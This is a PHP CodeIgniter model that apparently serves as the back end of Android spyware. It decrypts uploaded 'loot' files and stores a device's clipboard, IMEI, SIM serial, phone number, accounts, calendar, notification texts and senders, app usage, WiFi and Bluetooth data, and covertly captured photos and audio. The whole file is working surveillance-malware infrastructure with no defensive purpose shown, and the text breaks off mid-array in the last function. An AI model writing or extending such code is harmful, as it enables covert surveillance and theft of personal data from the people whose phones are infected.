<?php

namespace App\Models;

use CodeIgniter\Model;

/**
 * Mod_Parse_Advanced
 *
 * Handles decryption and DB ingestion for all 8 Advanced Data Extractors:
 *   1. DeviceContextExtractor  → tbl_device_context
 *   2. NetworkInfoExtractor    → tbl_network_info + tbl_nearby_wifi
 *   3. AccountsExtractor       → tbl_accounts
 *   4. CalendarExtractor       → tbl_calendar_events
 *   5. AppUsageExtractor       → tbl_app_usage + tbl_app_usage_sessions
 *   6. NotificationExtractor   → tbl_notifications
 *   7. BluetoothExtractor      → tbl_bluetooth + tbl_bluetooth_paired
 *   8. SensorProfileExtractor  → tbl_sensor_profile
 *
 * All methods follow the same pattern as Mod_Parse_Loot:
 *   - Read encrypted file from WRITEPATH/uploads/text_dump/
 *   - Decrypt via Mod_Crypt::decode_content() (AES-128-CBC)
 *   - Parse JSON and batch-insert, skipping duplicates
 */
class Mod_Parse_Advanced extends Model
{
    /**
     * DeviceContextExtractor
     * File prefix: device_context_TIMESTAMP.enc
     */
    public function parse_device_context(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_device_context] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[Mod_Parse_Advanced::parse_device_context] Decryption failed for file: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_device_context] JSON decode failed for file: ' . $file_name . ' | Error: ' . json_last_error_msg());
                return false;
            }

            $battery      = $json['battery']  ?? [];
            $locale       = $json['locale']   ?? [];
            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id'                   => $owner_id,
                'device_id'                  => $device_id,
                // Battery
                'battery_level_percent'      => $json['battery_level']       ?? $battery['level_percent']        ?? null,
                'battery_is_charging'        => isset($json['battery_is_charging']) ? ($json['battery_is_charging'] ? 1 : 0) : (isset($battery['is_charging']) ? ($battery['is_charging'] ? 1 : 0) : null),
                'battery_plugged_usb'        => isset($json['battery_plugged_usb']) ? ($json['battery_plugged_usb'] ? 1 : 0) : (isset($battery['plugged_usb']) ? ($battery['plugged_usb'] ? 1 : 0) : null),
                'battery_plugged_ac'         => isset($json['battery_plugged_ac'])  ? ($json['battery_plugged_ac'] ? 1 : 0)  : (isset($battery['plugged_ac'])  ? ($battery['plugged_ac'] ? 1 : 0)  : null),
                'battery_temperature_celsius'=> $json['battery_temp']          ?? $battery['temperature_celsius']  ?? null,
                'battery_voltage_mv'         => $json['battery_voltage']       ?? $battery['voltage_mv']           ?? null,
                'battery_health'             => $json['battery_health']        ?? $battery['health']               ?? null,
                // Clipboard
                'clipboard_text'             => $json['clipboard_content']     ?? $json['clipboard_text']          ?? null,
                // Locale
                'locale_country'             => $json['device_country']        ?? $locale['country']               ?? null,
                'locale_display_country'     => $locale['display_country']       ?? null,
                'locale_language'            => $json['device_language']       ?? $locale['language']              ?? null,
                'locale_display_language'    => $locale['display_language']      ?? null,
                'locale_timezone'            => $json['device_timezone']       ?? $locale['timezone']              ?? null,
                'locale_timezone_offset_ms'  => $json['device_timezone_offset'] ?? $locale['timezone_offset_ms']   ?? null,
                // Metadata
                'extracted_at'               => $extracted_at,
                'created_at'                 => $dated,
                'updated_at'                 => $dated,
            ];

            $this->db->table('tbl_device_context')->insert($data);
            log_message('info', '[parse_device_context] Inserted 1 row from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_context] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * NetworkInfoExtractor
     * File prefix: network_info_TIMESTAMP.enc
     */
    public function parse_network_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_network_info] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[Mod_Parse_Advanced::parse_network_info] Decryption failed for file: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_network_info] JSON decode failed for file: ' . $file_name . ' | Error: ' . json_last_error_msg());
                return false;
            }

            $wifi         = $json['current_wifi'] ?? [];
            $extracted_at = $json['extracted_at'] ?? null;

            $mainData = [
                'owner_id'               => $owner_id,
                'device_id'              => $device_id,
                'is_connected'           => isset($json['is_connected'])  ? ($json['is_connected'] ? 1 : 0) : null,
                'connection_type'        => $json['connection_type']       ?? null,
                'is_roaming'             => isset($json['is_roaming'])    ? ($json['is_roaming'] ? 1 : 0) : null,
                'network_operator_name'  => $json['network_operator_name'] ?? null,
                'network_country_iso'    => $json['network_country_iso']   ?? null,
                'sim_operator_name'      => $json['sim_operator_name']     ?? null,
                'sim_country_iso'        => $json['sim_country_iso']       ?? null,
                'sim_state'              => $json['sim_state']             ?? null,
                'phone_type'             => $json['phone_type']            ?? null,
                'device_imei'            => $json['device_imei']           ?? null,
                'sim_serial'             => $json['sim_serial']            ?? null,
                'subscriber_id'          => $json['subscriber_id']         ?? null,
                // Current WiFi (flattened)
                'wifi_ssid'              => $wifi['ssid']        ?? null,
                'wifi_bssid'             => $wifi['bssid']       ?? null,
                'wifi_link_speed'        => $wifi['link_speed']  ?? null,
                'wifi_frequency'         => $wifi['frequency']   ?? null,
                'wifi_rssi'              => $wifi['rssi']        ?? null,
                'wifi_mac_address'       => $wifi['mac_address'] ?? null,
                'wifi_ip_address'        => $wifi['ip_address']  ?? null,
                'extracted_at'           => $extracted_at,
                'created_at'             => $dated,
                'updated_at'             => $dated,
            ];

            $this->db->table('tbl_network_info')->insert($mainData);
            $networkInfoId = $this->db->insertID();

            // Nearby WiFi child rows
            $nearbyList = $json['network_list'] ?? $json['nearby_wifi'] ?? [];
            if (!empty($nearbyList) && is_array($nearbyList) && $networkInfoId > 0) {
                $nearbyBatch = [];
                foreach ($nearbyList as $ap) {
                    $nearbyBatch[] = [
                        'network_info_id' => $networkInfoId,
                        'owner_id'        => $owner_id,
                        'ssid'            => $ap['ssid']         ?? null,
                        'bssid'           => $ap['bssid']        ?? null,
                        'capabilities'    => $ap['capabilities'] ?? null,
                        'level'           => $ap['level']        ?? null,
                        'frequency'       => $ap['frequency']    ?? null,
                        'created_at'      => $dated,
                    ];
                }
                if (!empty($nearbyBatch)) {
                    $this->db->table('tbl_nearby_wifi')->insertBatch($nearbyBatch);
                }
            }

            log_message('info', '[parse_network_info] Inserted network snapshot + ' . count($nearbyList) . ' nearby APs from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_network_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * AccountsExtractor
     * File prefix: accounts_TIMESTAMP.enc
     */
    public function parse_accounts(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_accounts] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_accounts] Decryption failed: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null || !isset($json['accounts_list']) || !is_array($json['accounts_list'])) {
                log_message('error', '[parse_accounts] Invalid JSON or missing accounts_list: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $total_count  = $json['total_count']  ?? count($json['accounts_list']);
            $summary_json = isset($json['summary']) ? json_encode($json['summary']) : null;

            $batchData = [];
            $seenKeys  = [];
            foreach ($json['accounts_list'] as $account) {
                $accountName = $account['name'] ?? null;
                $accountType = $account['type'] ?? null;

                if (!$accountName && !$accountType) {
                    continue;
                }

                // Batch duplicate check
                $key = $accountName . '|' . $accountType;
                if (in_array($key, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_accounts')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('account_name', $accountName)
                    ->where('account_type', $accountType)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $key;
                    $batchData[] = [
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'account_name' => $accountName,
                        'account_type' => $accountType,
                        'summary_json' => $summary_json,
                        'total_count'  => $total_count,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                        'updated_at'   => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_accounts')->insertBatch($batchData);
            }

            log_message('info', '[parse_accounts] Inserted ' . count($batchData) . ' account rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_accounts] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * CalendarExtractor
     * File prefix: calendar_TIMESTAMP.enc
     */
    public function parse_calendar(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_calendar] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_calendar] Decryption failed: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            $calendarList = $json['calendar_list'] ?? $json['events'] ?? null;
            if ($calendarList === null || !is_array($calendarList)) {
                log_message('error', '[parse_calendar] Invalid JSON or missing calendar_list/events: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $batchData = [];
            $seenKeys  = [];

            foreach ($calendarList as $event) {
                $eventId = $event['id'] ?? null;
                if (!$eventId) continue;

                // Batch duplicate check
                if (in_array($eventId, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_calendar_events')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('event_id', $eventId)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $eventId;
                    $batchData[] = [
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'event_id'     => $eventId,
                        'title'        => $event['title']       ?? null,
                        'description'  => $event['description'] ?? null,
                        'location'     => $event['location']    ?? null,
                        'start_time'   => $event['start_time']  ?? null,
                        'end_time'     => $event['end_time']    ?? null,
                        'all_day'      => isset($event['all_day']) ? ($event['all_day'] ? 1 : 0) : 0,
                        'organizer'    => $event['organizer']   ?? null,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                        'updated_at'   => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_calendar_events')->insertBatch($batchData);
            }

            log_message('info', '[parse_calendar] Inserted ' . count($batchData) . ' calendar events from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_calendar] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * AppUsageExtractor
     * File prefix: app_usage_TIMESTAMP.enc
     */
    public function parse_app_usage(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_app_usage] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[Mod_Parse_Advanced::parse_app_usage] Decryption failed for file: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_app_usage] JSON decode failed for file: ' . $file_name . ' | Error: ' . json_last_error_msg());
                return false;
            }

            // Flexible detection of the data array
            $usageRows = null;
            if (isset($json['usage_list']) && is_array($json['usage_list'])) {
                $usageRows = $json['usage_list'];
            } elseif (isset($json['app_usage']) && is_array($json['app_usage'])) {
                $usageRows = $json['app_usage'];
            } elseif (isset($json['usage']) && is_array($json['usage'])) {
                $usageRows = $json['usage'];
            } elseif (is_array($json) && (isset($json[0]) || empty($json))) {
                $usageRows = $json;
            }

            if ($usageRows === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_app_usage] Could not find usage data array in file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? time() * 1000;
            $seenPackages = [];
            $inserted = 0;
            $skipped = 0;

            foreach ($usageRows as $app) {
                // Flexible package key detection
                $packageName = $app['package_name'] ?? $app['package'] ?? $app['name'] ?? null;
                if (!$packageName) {
                    $skipped++;
                    continue;
                }

                // Batch duplicate check
                if (in_array($packageName, $seenPackages)) {
                    $skipped++;
                    continue;
                }

                // Upsert logic: skip if identical snapshot already stored
                $exists = $this->db->table('tbl_app_usage')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('package_name', $packageName)
                    ->where('extracted_at', $extracted_at)
                    ->countAllResults() > 0;

                if ($exists) {
                    $skipped++;
                    continue;
                }

                $seenPackages[] = $packageName;

                $appData = [
                    'owner_id'              => $owner_id,
                    'device_id'             => $device_id,
                    'package_name'          => $packageName,
                    'app_name'              => $app['app_name']             ?? null,
                    'foreground_time_ms'    => $app['foreground_time_ms']   ?? $app['foreground_ms'] ?? $app['totalTimeInForeground'] ?? $app['total_time_in_foreground'] ?? $app['app_usage_time'] ?? $app['usage_time'] ?? $app['totalTimeVisible'] ?? $app['total_time_visible'] ?? $app['totalTime'] ?? $app['total_time'] ?? 0,
                    'foreground_time_hours' => $app['foreground_time_hours'] ?? $app['foreground_hours'] ?? 0,
                    'last_time_used'        => $app['last_time_used']       ?? $app['last_used'] ?? null,
                    'is_system_app'         => isset($app['is_system_app']) ? ($app['is_system_app'] ? 1 : 0) : 0,
                    'extracted_at'          => $extracted_at,
                    'created_at'            => $dated,
                    'updated_at'            => $dated,
                ];

                $this->db->table('tbl_app_usage')->insert($appData);
                $usageId = $this->db->insertID();
                $inserted++;

                // Insert session events
                if (!empty($app['sessions']) && is_array($app['sessions']) && $usageId > 0) {
                    $sessionBatch = [];
                    foreach ($app['sessions'] as $session) {
                        $sessionBatch[] = [
                            'app_usage_id' => $usageId,
                            'owner_id'     => $owner_id,
                            'event_type'   => $session['event_type'] ?? null,
                            'timestamp'    => $session['timestamp']  ?? null,
                            'created_at'   => $dated,
                        ];
                    }
                    if (!empty($sessionBatch)) {
                        $this->db->table('tbl_app_usage_sessions')->insertBatch($sessionBatch);
                    }
                }
            }

            log_message('info', '[parse_app_usage] Processed ' . count($usageRows) . " apps from $file_name (Inserted: $inserted, Skipped: $skipped)");
            return true;


        } catch (\Exception $e) {
            log_message('error', '[parse_app_usage] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * NotificationExtractor
     * File prefix: notifications_TIMESTAMP.enc
     * NOTE: The payload is a raw JSON *array*, not an object.
     */
    public function parse_notifications(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_notifications] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_notifications] Decryption failed: ' . $file_name);
                return false;
            }

            // Payload could be raw JSON array or an object containing notifications_list
            $jsonParsed = json_decode($decoded, true);
            $notifications = null;
            
            if (isset($jsonParsed['notifications_list']) && is_array($jsonParsed['notifications_list'])) {
                $notifications = $jsonParsed['notifications_list'];
            } else {
                $notifications = $jsonParsed;
            }

            if ($notifications === null || !is_array($notifications)) {
                log_message('error', '[Mod_Parse_Advanced::parse_notifications] Invalid JSON (expected array or notifications_list): ' . $file_name);
                return false;
            }

            $batchData = [];
            $seenKeys  = [];
            foreach ($notifications as $notif) {
                $notifId    = $notif['id']        ?? null;
                $notifTs    = $notif['timestamp'] ?? null;
                $action     = $notif['action']    ?? null;

                // Unique key for notifications: ID + Timestamp + Action
                $key = "{$notifId}|{$notifTs}|{$action}";
                if (in_array($key, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_notifications')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('notification_id', $notifId)
                    ->where('notification_timestamp', $notifTs)
                    ->where('action', $action)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $key;
                    $batchData[] = [
                        'owner_id'               => $owner_id,
                        'device_id'              => $device_id,
                        'notification_id'        => $notifId,
                        'package_name'           => $notif['package']
                            ?? $notif['packageName']
                            ?? $notif['package_name']
                            ?? null,
                        'app_name'               => $notif['app_name'] ?? null,
                        'title'                  => $notif['raw_title'] ?? $notif['title']    ?? null,
                        'text'                   => $notif['raw_body']  ?? $notif['text']     ?? $notif['body'] ?? null,
                        'sender'                 => $notif['sender'] ?? $notif['sender_name'] ?? $notif['from'] ?? null,
                        'sub_text'               => $notif['sub_text'] ?? $notif['subText'] ?? null,
                        'category'               => $notif['category'] ?? $notif['channel'] ?? $notif['channel_id'] ?? null,
                        'visibility'             => $notif['visibility'] ?? null,
                        'is_screen_notification' => self::resolveScreenNotificationFlag($notif),
                        'notification_timestamp' => $notifTs,
                        'action'                 => $action,
                        'extracted_at'           => null, // raw array has no top-level extracted_at
                        'created_at'             => $dated,
                        'updated_at'             => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_notifications')->insertBatch($batchData);
            }

            log_message('info', '[parse_notifications] Inserted ' . count($batchData) . ' notification rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_notifications] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * BluetoothExtractor
     * File prefix: bluetooth_TIMESTAMP.enc
     */
    public function parse_bluetooth(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_bluetooth] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_bluetooth] Decryption failed: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_bluetooth] Invalid JSON: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $btData = [
                'owner_id'        => $owner_id,
                'device_id'       => $device_id,
                'is_enabled'      => isset($json['is_enabled']) ? ($json['is_enabled'] ? 1 : 0) : null,
                'adapter_name'    => $json['adapter_name']    ?? null,
                'adapter_address' => $json['adapter_address'] ?? null,
                'paired_count'    => $json['paired_count']    ?? 0,
                'extracted_at'    => $extracted_at,
                'created_at'      => $dated,
                'updated_at'      => $dated,
            ];

            $this->db->table('tbl_bluetooth')->insert($btData);
            $bluetoothId = $this->db->insertID();

            // Paired devices child rows
            $btList = $json['bluetooth_list'] ?? $json['paired_devices'] ?? [];
            if (!empty($btList) && is_array($btList) && $bluetoothId > 0) {
                $pairedBatch = [];
                foreach ($btList as $dev) {
                    $pairedBatch[] = [
                        'bluetooth_id' => $bluetoothId,
                        'owner_id'     => $owner_id,
                        'bt_name'      => $dev['name']       ?? null,
                        'bt_address'   => $dev['address']    ?? null,
                        'bt_type'      => $dev['type']       ?? null,
                        'bond_state'   => $dev['bond_state'] ?? null,
                        'alias'        => $dev['alias']      ?? null,
                        'created_at'   => $dated,
                    ];
                }
                if (!empty($pairedBatch)) {
                    $this->db->table('tbl_bluetooth_paired')->insertBatch($pairedBatch);
                }
            }

            log_message('info', '[parse_bluetooth] Inserted BT snapshot + ' . count($btList) . ' paired devices from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_bluetooth] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * SensorProfileExtractor
     * File prefix: sensors_TIMESTAMP.enc
     */
    public function parse_sensors(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_sensors] Cannot read: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_sensors] Decryption failed: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_sensors] JSON decode failed for file: ' . $file_name . ' | Error: ' . json_last_error_msg());
                return false;
            }

            // Flexible detection of the data array
            $sensorRows = null;
            if (isset($json['sensors']) && is_array($json['sensors'])) {
                $sensorRows = $json['sensors'];
            } elseif (isset($json['sensors_list']) && is_array($json['sensors_list'])) {
                $sensorRows = $json['sensors_list'];
            } elseif (is_array($json) && (isset($json[0]) || empty($json))) {
                $sensorRows = $json;
            }

            if ($sensorRows === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_sensors] Could not find sensor data array in file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $batchData    = [];
            $seenKeys     = [];

            foreach ($sensorRows as $sensor) {
                $typeId = $sensor['type_id'] ?? null;
                if ($typeId === null) continue;

                // Batch duplicate check
                if (in_array($typeId, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_sensor_profile')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('type_id', $typeId)
                    ->where('extracted_at', $extracted_at)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $typeId;
                    $batchData[] = [
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'sensor_name'  => $sensor['name']          ?? null,
                        'vendor'       => $sensor['vendor']        ?? null,
                        'type_id'      => $typeId,
                        'type_string'  => $sensor['type_string']   ?? null,
                        'version'      => $sensor['version']       ?? null,
                        'maximum_range'=> $sensor['maximum_range'] ?? null,
                        'resolution'   => $sensor['resolution']    ?? null,
                        'power_ma'     => $sensor['power_ma']      ?? null,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                        'updated_at'   => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_sensor_profile')->insertBatch($batchData);
            }

            log_message('info', '[parse_sensors] Inserted ' . count($batchData) . ' sensor rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_sensors] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Captured Media (Audio/Image)
     * File prefix: snap_TIMESTAMP.enc or audio_TIMESTAMP.enc
     */
    public function parse_captured_media(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null, string $type = 'image'): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            // 1. Read encrypted file
            $encryptedPath = WRITEPATH . 'uploads/text_dump/' . $file_name;
            $raw = file_get_contents($encryptedPath);
            if ($raw === false) {
                log_message('error', '[parse_captured_media] Cannot read: ' . $file_name);
                return false;
            }

            // 2. Decrypt
            $decoded = $cryptModel->decrypt_media($raw);
            if ($decoded === false) {
                log_message('error', '[parse_captured_media] Decryption failed for file: ' . $file_name);
                return false;
            }

            // 3. Determine category and extension
            $category = $type;
            $extension = ($type === 'audio') ? 'mp3' : 'jpg';
            $mimeType  = ($type === 'audio') ? 'audio/mpeg' : 'image/jpeg';

            // 4. Create storage directory
            $targetDir = ($type === 'audio') ? WRITEPATH . 'uploads/audio/' : WRITEPATH . 'uploads/captured/';
            if (!is_dir($targetDir)) {
                mkdir($targetDir, 0777, true);
            }

            // 5. Save decrypted file
            $newFileName = $category . '_' . time() . '_' . uniqid() . '.' . $extension;
            $targetPath = $targetDir . $newFileName;
            
            if (file_put_contents($targetPath, $decoded) === false) {
                log_message('error', '[parse_captured_media] Failed to save decrypted file: ' . $newFileName);
                return false;
            }

            // 6. Insert into tbl_captured_media
            $data = [
                'owner_id'          => $owner_id,
                'device_id'         => $device_id,
                'media_type'        => $category,
                'original_filename' => $file_name,
                'stored_filename'   => $newFileName,
                'file_size'         => strlen($decoded),
                'mime_type'         => $mimeType,
                'file_record_id'    => $fileRecordId,
                'created_at'        => $dated,
                'updated_at'        => $dated,
            ];

            $this->db->table('tbl_captured_media')->insert($data);
            log_message('info', '[parse_captured_media] Saved captured ' . $category . ' to ' . $newFileName);
            
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_captured_media] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Resolve whether a notification was shown on screen (heads-up / lock screen).
     *
     * @param array<string, mixed> $notif
     */
    private static function resolveScreenNotificationFlag(array $notif): int
    {
        if (!empty($notif['is_screen_notification'])) {
            return 1;
        }
        foreach (['screen', 'on_screen', 'heads_up', 'headsUp', 'lock_screen', 'lockScreen'] as $key) {
            if (!empty($notif[$key])) {
                return 1;
            }
        }

        return 0;
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * DeviceInfoExtractor → tbl_device_profile
     * File category: deviceinfo / device_info
     * Stores a full hardware/software snapshot of the device.
     */
    public function parse_device_info(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_device_info] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_device_info] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_device_info] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['extraction_timestamp'] ?? null;

            // Avoid duplicate snapshots for same device+timestamp
            $exists = $this->db->table('tbl_device_profile')
                ->where('device_id', $device_id)
                ->where('extraction_timestamp', $extracted_at)
                ->countAllResults() > 0;

            if ($exists) {
                log_message('info', '[parse_device_info] Duplicate snapshot skipped for device: ' . $device_id);
                return true;
            }

            $data = [
                'device_model'                => $json['device_model']                ?? null,
                'device_brand'                => $json['device_brand']                ?? null,
                'device_manufacturer'         => $json['device_manufacturer']         ?? null,
                'device_product'              => $json['device_product']              ?? null,
                'device_device'               => $json['device_device']               ?? null,
                'device_board'                => $json['device_board']                ?? null,
                'device_hardware'             => $json['device_hardware']             ?? null,
                'android_version'             => $json['android_version']             ?? null,
                'android_sdk_int'             => $json['android_sdk_int']             ?? null,
                'android_codename'            => $json['android_codename']            ?? null,
                'android_incremental'         => $json['android_incremental']         ?? null,
                'android_base_os'             => $json['android_base_os']             ?? null,
                'android_security_patch'      => $json['android_security_patch']      ?? null,
                'build_id'                    => $json['build_id']                    ?? null,
                'build_type'                  => $json['build_type']                  ?? null,
                'build_tags'                  => $json['build_tags']                  ?? null,
                'build_fingerprint'           => $json['build_fingerprint']           ?? null,
                'build_time'                  => $json['build_time']                  ?? null,
                'build_user'                  => $json['build_user']                  ?? null,
                'build_host'                  => $json['build_host']                  ?? null,
                'build_display'               => $json['build_display']               ?? null,
                'android_id'                  => $json['android_id']                  ?? null,
                'display_width'               => $json['display_width']               ?? null,
                'display_height'              => $json['display_height']              ?? null,
                'display_density'             => $json['display_density']             ?? null,
                'display_density_dpi'         => $json['display_density_dpi']         ?? null,
                'display_scaled_density'      => $json['display_scaled_density']      ?? null,
                'display_xdpi'                => $json['display_xdpi']                ?? null,
                'display_ydpi'                => $json['display_ydpi']                ?? null,
                'cpu_cores'                   => $json['cpu_cores']                   ?? null,
                'cpu_abi'                     => $json['cpu_abi']                     ?? null,
                'cpu_abis'                    => is_array($json['cpu_abis'] ?? null) ? implode(',', $json['cpu_abis']) : ($json['cpu_abis'] ?? null),
                'memory_total_mb'             => $json['memory_total_mb']             ?? null,
                'memory_free_mb'              => $json['memory_free_mb']              ?? null,
                'internal_storage_total_gb'   => $json['internal_storage_total_gb']   ?? null,
                'internal_storage_free_gb'    => $json['internal_storage_free_gb']    ?? null,
                'internal_storage_usable_gb'  => $json['internal_storage_usable_gb']  ?? null,
                'external_storage_total_gb'   => $json['external_storage_total_gb']   ?? null,
                'external_storage_free_gb'    => $json['external_storage_free_gb']    ?? null,
                'phone_number'                => $json['phone_number']                ?? null,
                'sim_operator'                => $json['sim_operator']                ?? null,
                'network_operator'            => $json['network_operator']            ?? null,
                'sim_country'                 => $json['sim_country']                 ?? null,
                'network_country'             => $json['network_country']             ?? null,
                'imei'                        => $json['imei']                        ?? null,
                'meid'                        => $json['meid']                        ?? null,
                'device_id'                   => $device_id,
                'sim_state'                   => $json['sim_state']                   ?? null,
